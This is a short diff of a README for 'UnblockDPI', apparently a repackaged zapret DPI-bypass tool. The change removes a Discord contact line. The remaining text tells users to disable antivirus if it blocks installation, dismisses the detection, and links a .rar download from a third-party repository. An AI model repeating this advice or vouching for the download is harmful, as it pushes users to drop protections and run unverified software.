@@ -12,9 +12,6 @@ https://github.com/bol-van/zapret
 If your antivirus blocks the installation, you may need to temporarily disable it.
 Once installed, the antivirus will not interfere since then it won't detect a threat. Think of it as judging a book by its cover.
 
-If you have any questions or need help setting it up:
-discord: 1z11
-
 Download links:
 
 https://github.com/Novulon/UnblockDPI/releases/download/UnblockDPI-1.0/UnBlockDPI.1.0.rar
